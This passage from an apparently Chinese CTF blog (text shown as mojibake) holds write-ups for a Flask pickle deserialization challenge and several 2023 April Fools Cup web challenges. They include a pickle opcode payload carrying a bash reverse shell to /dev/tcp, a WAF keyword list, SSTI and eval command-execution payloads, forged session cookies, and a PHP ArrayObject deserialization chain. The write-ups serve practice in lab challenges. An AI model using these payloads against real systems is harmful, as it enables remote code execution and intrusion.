class="hljs-string">&#x27;exec&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>, <span class="hljs-string">&#x27;template&#x27;</span>, <span class="hljs-string">&#x27;render&#x27;</span>, <span class="hljs-string">&#x27;\\&#x27;</span>,<br>                 <span class="hljs-string">&#x27;compile&#x27;</span>, <span class="hljs-string">&#x27;requests&#x27;</span>, <span class="hljs-string">&#x27;exit&#x27;</span>,  <span class="hljs-string">&#x27;pickle&#x27;</span>,<span class="hljs-string">&quot;class&quot;</span>,<span class="hljs-string">&quot;mro&quot;</span>,<span class="hljs-string">&quot;flask&quot;</span>,<span class="hljs-string">&quot;sys&quot;</span>,<span class="hljs-string">&quot;base&quot;</span>,<span class="hljs-string">&quot;init&quot;</span>,<span class="hljs-string">&quot;config&quot;</span>,<span class="hljs-string">&quot;session&quot;</span>&#125;:<br>            <span class="hljs-keyword">if</span> i.encode() <span class="hljs-keyword">in</span> pickle_data:<br>                <span class="hljs-keyword">return</span> i+<span class="hljs-string">&quot; waf !!!!!!!&quot;</span><br><br>        pickle.loads(pickle_data)<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;success pickle&quot;</span><br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;fail pickle&quot;</span><br><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/admin&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">admin</span>():<br>    username = session[<span class="hljs-string">&#x27;username&#x27;</span>]<br>    <span class="hljs-keyword">if</span> username != <span class="hljs-string">&quot;admin&quot;</span>:<br>        <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&#x27;You are not admin!&#x27;</span>&#125;)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Welcome Admin&quot;</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/src&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">src</span>():<br>    <span class="hljs-keyword">return</span>  <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;buu.py&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>,encoding=<span class="hljs-string">&quot;utf-8&quot;</span>).read()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, debug=<span class="hljs-literal">False</span>, port=<span class="hljs-number">5000</span>)<br></code></pre></td></tr></table></figure><p>åœ¨ppickleeè·¯ç”±ä¸­å­˜åœ¨<code>pickle.loads(pickle_data)</code>å°±å­˜åœ¨pickleååºåˆ—åŒ–</p><p>è¿‡æ»¤äº†å¾ˆå¤šå‘½ä»¤æ‰§è¡Œå‡½æ•°ï¼Œä½†æ˜¯subprocessæ²¡æœ‰è¢«è¿‡æ»¤ï¼Œè¿™é‡Œå¯ä»¥åˆ©ç”¨</p><p>payload1åå¼¹shell:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">b&#x27;&#x27;&#x27;csubprocess</span><br><span class="hljs-string">    run</span><br><span class="hljs-string">    p0</span><br><span class="hljs-string">    ((lp1</span><br><span class="hljs-string">    Vbash</span><br><span class="hljs-string">    p2</span><br><span class="hljs-string">    aV-c</span><br><span class="hljs-string">    p3</span><br><span class="hljs-string">    aVbash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</span><br><span class="hljs-string">    p4</span><br><span class="hljs-string">    atp5</span><br><span class="hljs-string">    Rp6.</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p>è§£é‡Š</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs smali">csubprocess\nrunï¼š<br><br>cï¼šè¡¨ç¤ºåŠ è½½æ¨¡å—ã€‚<br>subprocessï¼šå¯¼å…¥ Python æ ‡å‡†åº“ä¸­çš„ subprocess æ¨¡å—ã€‚<br>runï¼šå¼•ç”¨ subprocess.run æ–¹æ³•ã€‚<br>p0 åˆ° p6ï¼š<br><br>p0, p1, p2 ç­‰æ˜¯ pickle çš„å¼•ç”¨æ ‡è¯†ç¬¦ï¼Œè¡¨ç¤ºåºåˆ—åŒ–å¯¹è±¡çš„å†…éƒ¨æŒ‡é’ˆã€‚<br>((lp1ï¼š<br><br>åˆ›å»ºä¸€ä¸ªåˆ—è¡¨å¯¹è±¡å¹¶å¼€å§‹å¡«å……æ•°æ®ã€‚<br>Vbash\np2ï¼šåºåˆ—åŒ–å­—ç¬¦ä¸² <span class="hljs-string">&quot;bash&quot;</span> å¹¶ä¿å­˜åˆ° p2ã€‚<br><br>V-c\np3ï¼šåºåˆ—åŒ–å­—ç¬¦ä¸² <span class="hljs-string">&quot;-c&quot;</span> å¹¶ä¿å­˜åˆ° p3ã€‚<br><br>Vbash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1\np4ï¼š<br><br>åºåˆ—åŒ–çš„åå‘ shell å‘½ä»¤ï¼ŒæŒ‡å‘ /dev/tcp/ip/portã€‚<br>bash -iï¼šäº¤äº’å¼å¯åŠ¨ Bashã€‚<br>&gt;&amp; /dev/tcp/ip/portï¼šå°†æ ‡å‡†è¾“å‡ºå’Œæ ‡å‡†é”™è¯¯é‡å®šå‘åˆ°æŒ‡å®šçš„ IP å’Œç«¯å£ã€‚<br>0&gt;&amp;1ï¼šå°†æ ‡å‡†è¾“å…¥é‡å®šå‘ã€‚<br>atp5ï¼š<br><br>å°†ä¸Šè¿°åºåˆ—åŒ–å†…å®¹ä½œä¸ºå‚æ•°åˆ—è¡¨ï¼Œæœ€ç»ˆå­˜å‚¨åˆ° p5ã€‚<br>Rp6.ï¼š<br><br>è°ƒç”¨ subprocess.run å¹¶æ‰§è¡Œè¯¥å‘½ä»¤ã€‚<br></code></pre></td></tr></table></figure><p>payload2å¤–å¸¦åˆ°app.py:</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">getattr = <span class="hljs-keyword">GLOBAL</span>(<span class="hljs-string">&#x27;builtins&#x27;</span>, <span class="hljs-string">&#x27;getattr&#x27;</span>)<br><br><span class="hljs-keyword">open</span> = <span class="hljs-keyword">GLOBAL</span>(<span class="hljs-string">&#x27;builtins&#x27;</span>, <span class="hljs-string">&#x27;open&#x27;</span>)<br>flag=<span class="hljs-keyword">open</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>)<br><span class="hljs-keyword">read</span>=getattr(flag, <span class="hljs-string">&#x27;read&#x27;</span>)<br>f=<span class="hljs-keyword">open</span>(<span class="hljs-string">&#x27;./app.py&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>)<br><span class="hljs-keyword">write</span>=getattr(f, <span class="hljs-string">&#x27;write&#x27;</span>)<br>fff=<span class="hljs-keyword">read</span>()<br><span class="hljs-keyword">write</span>(fff)<br><span class="hljs-keyword">return</span><br></code></pre></td></tr></table></figure><p>è½¬åŒ–ä¸ºopcode</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">b<span class="hljs-string">&#x27;&#x27;&#x27;cbuiltins</span><br><span class="hljs-string">getattr</span><br><span class="hljs-string">p0</span><br><span class="hljs-string">0cbuiltins</span><br><span class="hljs-string">open</span><br><span class="hljs-string">p1</span><br><span class="hljs-string">0g1</span><br><span class="hljs-string">(S&#x27;</span>/flag<span class="hljs-string">&#x27;</span><br><span class="hljs-string">tRp2</span><br><span class="hljs-string">0g0</span><br><span class="hljs-string">(g2</span><br><span class="hljs-string">S&#x27;</span><span class="hljs-keyword">read</span><span class="hljs-string">&#x27;</span><br><span class="hljs-string">tRp3</span><br><span class="hljs-string">0g1</span><br><span class="hljs-string">(S&#x27;</span>./app.py<span class="hljs-string">&#x27;</span><br><span class="hljs-string">S&#x27;</span>w<span class="hljs-string">&#x27;</span><br><span class="hljs-string">tRp4</span><br><span class="hljs-string">0g0</span><br><span class="hljs-string">(g4</span><br><span class="hljs-string">S&#x27;</span>writ<span class="hljs-string">e&#x27;</span><br><span class="hljs-string">tRp5</span><br><span class="hljs-string">0g3</span><br><span class="hljs-string">(tRp6</span><br><span class="hljs-string">0g5</span><br><span class="hljs-string">(g6</span><br><span class="hljs-string">tR.&#x27;</span><span class="hljs-string">&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p>è§£é‡Šï¼š</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">cbuiltins<span class="hljs-symbol">\n</span>getattr<span class="hljs-symbol">\n</span>p0<span class="hljs-symbol">\n</span>ï¼š<br><br>c è¡¨ç¤ºå¯¼å…¥æ¨¡å—ï¼Œè¿™é‡Œå¼•ç”¨çš„æ˜¯ Python çš„å†…ç½®æ¨¡å— builtinsã€‚<br>getattr ç”¨äºè·å–æŒ‡å®šå¯¹è±¡çš„å±æ€§ã€‚<br>cbuiltins<span class="hljs-symbol">\n</span>open<span class="hljs-symbol">\n</span>p1<span class="hljs-symbol">\n</span>ï¼š<br><br>open æ˜¯ Python çš„å†…ç½®å‡½æ•°ï¼Œç”¨äºæ‰“å¼€æ–‡ä»¶ã€‚<br>0g1<span class="hljs-symbol">\n</span>(S&#x27;/flag&#x27;<span class="hljs-symbol">\n</span>tRp2<span class="hljs-symbol">\n</span>ï¼š<br><br>g1 å¼•ç”¨ä¹‹å‰åºåˆ—åŒ–çš„ open å‡½æ•°ã€‚<br>&#x27;/flag&#x27; æ˜¯æ–‡ä»¶è·¯å¾„ï¼Œè¡¨ç¤ºå°è¯•æ‰“å¼€ /flag æ–‡ä»¶ã€‚<br>tR è°ƒç”¨ open æ–¹æ³•ï¼Œè¿”å›ä¸€ä¸ªæ–‡ä»¶å¯¹è±¡ï¼ˆä¿å­˜åˆ° p2ï¼‰ã€‚<br>0g0<span class="hljs-symbol">\n</span>(g2<span class="hljs-symbol">\n</span>S&#x27;read&#x27;<span class="hljs-symbol">\n</span>tRp3<span class="hljs-symbol">\n</span>ï¼š<br><br>ä½¿ç”¨ getattr è·å–æ–‡ä»¶å¯¹è±¡ï¼ˆg2 æ˜¯ /flag æ–‡ä»¶ï¼‰çš„ read æ–¹æ³•ã€‚<br>tR è°ƒç”¨ read æ–¹æ³•ï¼Œä¿å­˜è¯»å–çš„å†…å®¹åˆ° p3ã€‚<br>0g1<span class="hljs-symbol">\n</span>(S&#x27;./app.py&#x27;<span class="hljs-symbol">\n</span>S&#x27;w&#x27;<span class="hljs-symbol">\n</span>tRp4<span class="hljs-symbol">\n</span>ï¼š<br><br>å†æ¬¡è°ƒç”¨ open å‡½æ•°ï¼Œè¿™æ¬¡æ‰“å¼€çš„æ˜¯ ./app.py æ–‡ä»¶ï¼Œä»¥å†™å…¥æ¨¡å¼ (w) æ‰“å¼€ï¼Œè¿”å›æ–‡ä»¶å¯¹è±¡ï¼ˆä¿å­˜åˆ° p4ï¼‰ã€‚<br>0g0<span class="hljs-symbol">\n</span>(g4<span class="hljs-symbol">\n</span>S&#x27;write&#x27;<span class="hljs-symbol">\n</span>tRp5<span class="hljs-symbol">\n</span>ï¼š<br><br>ä½¿ç”¨ getattr è·å–ç›®æ ‡æ–‡ä»¶å¯¹è±¡ï¼ˆp4ï¼‰çš„ write æ–¹æ³•ã€‚<br>tR è¿”å› write æ–¹æ³•å¯¹è±¡ï¼Œä¿å­˜åˆ° p5ã€‚<br>0g5<span class="hljs-symbol">\n</span>(g6<span class="hljs-symbol">\n</span>tR.ï¼š<br><br>è°ƒç”¨ write æ–¹æ³•ï¼Œå°†ä¹‹å‰è¯»å–çš„ /flag æ–‡ä»¶å†…å®¹å†™å…¥ ./app.py æ–‡ä»¶ã€‚<br>åŠŸèƒ½æ¦‚è¿°<br>ååºåˆ—åŒ–æ­¤æ•°æ®åï¼Œç¨‹åºå°†æ‰§è¡Œä»¥ä¸‹æ“ä½œï¼š<br><br>æ‰“å¼€ /flag æ–‡ä»¶å¹¶è¯»å–å…¶å†…å®¹ã€‚<br>æ‰“å¼€æˆ–åˆ›å»º ./app.py æ–‡ä»¶ï¼Œä»¥å†™å…¥æ¨¡å¼å‡†å¤‡å†™å…¥ã€‚<br>å°† /flag æ–‡ä»¶çš„å†…å®¹å†™å…¥åˆ° ./app.py æ–‡ä»¶ä¸­ã€‚<br></code></pre></td></tr></table></figure><p>è‡ªå·±å¯¹äºpickleçš„ååºåˆ—åŒ–å’Œopcodeçš„ç¼–å†™è¿˜ä¸æ˜¯å¾ˆç†Ÿ</p><p>è¿˜å¾—ç»ƒ</p>]]></content>
    
    
    <categories>
      
      <category>æ¯æ—¥ä¸€web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>opcode</tag>
      
      <tag>pickle</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2025.1.22</title>
    <link href="/2025/01/22/%E6%AF%8F%E6%97%A5%E4%B8%80web-2025-1-22/"/>
    <url>/2025/01/22/%E6%AF%8F%E6%97%A5%E4%B8%80web-2025-1-22/</url>
    
    <content type="html"><![CDATA[<h1 id="2023æ„šäººæ¯easy-ssti"><a href="#2023æ„šäººæ¯easy-ssti" class="headerlink" title="2023æ„šäººæ¯easy-ssti"></a>2023æ„šäººæ¯easy-ssti</h1><p>è¿›å…¥F12æ‰“å¼€æ§åˆ¶å°æç¤ºä¸‹è½½app.zip</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> render_template_string,render_template<br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/hello/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hello</span>(<span class="hljs-params">name=<span class="hljs-literal">None</span></span>):<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;hello.html&#x27;</span>,name=name)<br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/hello/&lt;name&gt;&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hellodear</span>(<span class="hljs-params">name</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;ge&quot;</span> <span class="hljs-keyword">in</span> name:<br>        <span class="hljs-keyword">return</span> render_template_string(<span class="hljs-string">&#x27;hello %s&#x27;</span> % name)<br>    <span class="hljs-keyword">elif</span> <span class="hljs-string">&quot;f&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> name:<br>        <span class="hljs-keyword">return</span> render_template_string(<span class="hljs-string">&#x27;hello %s&#x27;</span> % name)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Nonononon&#x27;</span><br></code></pre></td></tr></table></figure><p>helloç›®å½•ä¸‹æœ‰ssti</p><p>payloadè¦æœ‰geæˆ–è€…ä¸èƒ½æœ‰f</p><p>å°è¯•æ‰“</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;lipsum.__globals__[<span class="hljs-string">&#x27;os&#x27;</span>].popen(<span class="hljs-string">&#x27;ls /&#x27;</span>).read()&#125;&#125;<br></code></pre></td></tr></table></figure><p>ä½†æ˜¯ &#x2F; è¢«å½“ä½œè·¯ç”±æŠ¥é”™ï¼Œå°è¯•ç»•è¿‡ï¼Œä½¿ç”¨base64ç¼–ç <strong>åå¼•å·</strong>æ‰§è¡Œå‘½ä»¤</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">`<span class="hljs-built_in">echo</span> bHMgLw== | <span class="hljs-built_in">base64</span> -d`<br></code></pre></td></tr></table></figure><p>å¾—åˆ°</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;lipsum.__globals__[<span class="hljs-string">&#x27;os&#x27;</span>].popen(<span class="hljs-string">&#x27;`echo bHMgLw== | base64 -d`&#x27;</span>).read()&#125;&#125;<br></code></pre></td></tr></table></figure><p>æœ€åä½¿ç”¨</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;lipsum.__globals__[<span class="hljs-string">&#x27;os&#x27;</span>].popen(<span class="hljs-string">&#x27;`echo Y2F0IC9mbGFn | base64 -d`&#x27;</span>).read()&#125;&#125;<br></code></pre></td></tr></table></figure><p>æ‹¿åˆ°flag</p><h1 id="2023æ„šäººæ¯easy-flask"><a href="#2023æ„šäººæ¯easy-flask" class="headerlink" title="2023æ„šäººæ¯easy-flask"></a>2023æ„šäººæ¯easy-flask</h1><p>è¿›å…¥çœ‹è§ç™»å½•æ¡†å°è¯•sqlï¼Œxssï¼Œsstiæ²¡ç»“æœ</p><p>å‘ç°adminè´¦å·æç¤ºå¯†ç é”™è¯¯ï¼Œæ³¨å†Œè´¦å·è¿›å»çœ‹çœ‹</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250122150714144.png" alt="1"></p><p>æç¤ºæˆ‘ä»¬æ˜¯userï¼Œå†learnçœ‹è§å¯†ç æ˜¯S3cr3tK3y</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250122150747281.png" alt="image-20250122150747281"></p><p>çˆ†ç ´session,æ‹¿åˆ°</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs clean">&#123;<span class="hljs-string">&#x27;loggedin&#x27;</span>: <span class="hljs-literal">True</span>, <span class="hljs-string">&#x27;role&#x27;</span>: <span class="hljs-string">&#x27;user&#x27;</span>, <span class="hljs-string">&#x27;username&#x27;</span>: <span class="hljs-string">&#x27;1&#x27;</span>&#125;<br>-&gt; &#123;<span class="hljs-string">&#x27;loggedin&#x27;</span>: <span class="hljs-literal">True</span>, <span class="hljs-string">&#x27;role&#x27;</span>: <span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-string">&#x27;username&#x27;</span>: <span class="hljs-string">&#x27;1&#x27;</span>&#125;<br></code></pre></td></tr></table></figure><p>ä¿®æ”¹ä¸ºadminç”¨å¯†é’¥åŠ å¯†,æ›¿æ¢å…ƒç´ session</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">eyJsb2dnZWRpbiI6dHJ1ZSwicm9sZSI6ImFkbWluIiwidXNlcm5hbWUiOiIxIn0<span class="hljs-selector-class">.Z5CcCA</span>.IZ_i9nESqDbObpSXrK72b8-VfZ8<br></code></pre></td></tr></table></figure><p>ä¼ªé€ æˆåŠŸçœ‹è§ä¸€ä¸ªä¸‹è½½</p><p>â€‹<img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250122152102290.png" alt="image-20250122152102290"></p><p>ä½†æ˜¯ä¸‹è½½æ˜¯ä¸€äº›æ²¡ç”¨çš„faskflag</p><p>æŠ“åŒ…å‘ç°å­˜åœ¨ä»»æ„æ–‡ä»¶ä¸‹è½½ï¼Œä¸‹è½½æºç çœ‹çœ‹&#x2F;app&#x2F;app.pyç»å¯¹è·¯å¾„</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250122152504059.png" alt="image-20250122152504059"></p><p>å‘ç°helloç›®å½•å­˜åœ¨rce</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/hello?<span class="hljs-built_in">eval</span>=__import__(<span class="hljs-string">&#x27;os&#x27;</span>).popen(<span class="hljs-string">&#x27;cat /flag_is_h3re &#x27;</span>).<span class="hljs-built_in">read</span>()<br></code></pre></td></tr></table></figure><p>å¯¼å…¥osåº“æ‹¿åˆ°flag</p><h1 id="2023æ„šäººæ¯easy-php"><a href="#2023æ„šäººæ¯easy-php" class="headerlink" title="2023æ„šäººæ¯easy-php"></a>2023æ„šäººæ¯easy-php</h1><p>popé“¾ï¼Œé“¾å­å¾ˆç®€å•ï¼Œä½†æ˜¯ä¸èƒ½ç”¨Oï¼Œaå¼€å¤´ä¹Ÿå°±æ˜¯ä¸èƒ½ç”¨æ•°ç»„ç»•è¿‡</p><p>æŸ¥äº†ä¸‹èµ„æ–™ï¼Œè¦ç”¨å®ç°äº†<code>Serializable</code> æ¥å£çš„åŸç”Ÿç±»æ¥æ„é€ </p><p>æŸ¥æ‰¾å®ç°äº†serializableæ¥å£çš„ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$classes</span> = <span class="hljs-title function_ invoke__">get_declared_classes</span>();<span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$classes</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$class</span>) &#123;<br><br>    <span class="hljs-variable">$methods</span> = <span class="hljs-title function_ invoke__">get_class_methods</span>(<span class="hljs-variable">$class</span>);<br><br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$methods</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$method</span>) &#123;<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$method</span>, <span class="hljs-keyword">array</span>(<br><br>            <span class="hljs-string">&#x27;unserialize&#x27;</span>,<br><br>        ))) &#123;<br><br>            <span class="hljs-keyword">print</span> <span class="hljs-variable">$class</span> . <span class="hljs-string">&#x27;::&#x27;</span> . <span class="hljs-variable">$method</span> . <span class="hljs-string">&quot;\n&quot;</span>;<br><br>        &#125;<br><br>    &#125;&#125;<br></code></pre></td></tr></table></figure><p>è™½ç„¶åœ¨ä½ç‰ˆæœ¬çš„æ—¶å€™å¯ä»¥åœ¨Oaåé¢åŠ +ç»•è¿‡ä½†æ˜¯è¿™é‡Œä¸è¡Œï¼Œç‰ˆæœ¬åº”è¯¥åœ¨7.4+</p><p>æ‰€æœ‰payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfshow</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$ctfshow</span>;<br><br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> ctfshow;<br><span class="hljs-variable">$a</span>-&gt;ctfshow=<span class="hljs-string">&quot;ls /&quot;</span>;<br><span class="hljs-variable">$arr</span>=<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;evil&quot;</span>=&gt;<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$oa</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">ArrayObject</span>(<span class="hljs-variable">$arr</span>);<br><span class="hljs-variable">$res</span>=<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$oa</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$res</span>;<br><span class="hljs-meta">?&gt;</span>;<br></code></pre></td></tr></table></figure><blockquote><p>æ³¨æ„ï¼šä¸è¦å†phpstormè¿è¡Œä»£ç ï¼Œä¸ç„¶ä¼šä»¥Oå¼€å¤´åœ¨æœ¬åœ°åŸå§‹ç¯å¢ƒè¿è¡Œ</p></blockquote><p>æœ€ç»ˆpayload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">C:<span class="hljs-number">11</span>:<span class="hljs-string">&quot;ArrayObject&quot;</span>:<span class="hljs-number">78</span>:&#123;x:i:<span class="hljs-number">0</span>;a:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;evil&quot;</span>;O:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;ctfshow&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;ctfshow&quot;</span>;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;cat /f*&quot;</span>;&#125;&#125;;m:a:<span class="hljs-number">0</span>:&#123;&#125;&#125;<br></code></pre></td></tr></table></figure><h2 id="è§£é‡Šä¸ºä»€ä¹ˆä¸ä¼šè§¦å‘-wakeup"><a href="#è§£é‡Šä¸ºä»€ä¹ˆä¸ä¼šè§¦å‘-wakeup" class="headerlink" title="è§£é‡Šä¸ºä»€ä¹ˆä¸ä¼šè§¦å‘__wakeup()"></a>è§£é‡Šä¸ºä»€ä¹ˆä¸ä¼šè§¦å‘__wakeup()</h2><p>Oæ ‡è¯†ç¬¦ä»£è¡¨å¯¹è±¡ç±»å‹ï¼Œè€ŒCæ ‡è¯†ç¬¦ä»£è¡¨ç±»åç±»å‹ã€‚å¦‚æœå°†Cæ›¿æ¢ä¸ºOï¼Œåˆ™åœ¨ååºåˆ—åŒ–æ—¶ä¼šå°†å…¶è§£é‡Šä¸ºä¸€ä¸ªæ–°çš„ç±»åå­—ç¬¦ä¸²ï¼Œä»è€Œåˆ›å»ºä¸€ä¸ªæ–°çš„ç±»è€Œä¸æ˜¯å¯¹è±¡ã€‚å› ä¸ºè¿™ä¸ªæ–°çš„ç±»æ²¡æœ‰è¢«åºåˆ—åŒ–è¿‡ï¼Œæ‰€ä»¥å®ƒæ²¡æœ‰ä»»ä½•å±æ€§æˆ–æ–¹æ³•ã€‚è¿™æ 